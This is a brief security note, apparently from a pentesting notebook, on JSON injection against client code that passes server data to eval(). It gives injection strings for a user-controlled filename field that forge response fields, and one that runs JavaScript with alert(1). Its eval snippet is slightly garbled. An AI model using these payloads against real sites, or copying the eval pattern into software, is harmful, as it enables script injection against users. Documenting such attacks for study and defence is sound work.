#JSON Injection
-----------------------------------------------------------------

## How to inject for a valid json returned?

client js code as :
```javascript
  data = ... ;
  var jsonpbj = eval("("++")");
```
"data" maybe :
```javascript
  {'original':'008.jpg','url':'http://hikerell.cn/getFile/20141103141947:42d3db16e960a621f5e85d456f2054ae.jpg','title':'','state':'SUCCESS'}
```
the "original" could be controled, then wen can submit "original" using the value:
```
  fake.jpg','url':'fakeurl','title':'faketitle','state':'SUCCESS'})//{'name':'008.jpg"
```  
  or:
```
  fake.jpg','url':'fakeurl','title':'faketitle','state':'SUCCESS'})<!--{'name':'008.jpg"
```
  or. execute js directly:
```
  fake.jpg','url':'fakeurl','title':'faketitle','state':'SUCCESS'})(alert(1))<!--{'name':'008.jpg"
```
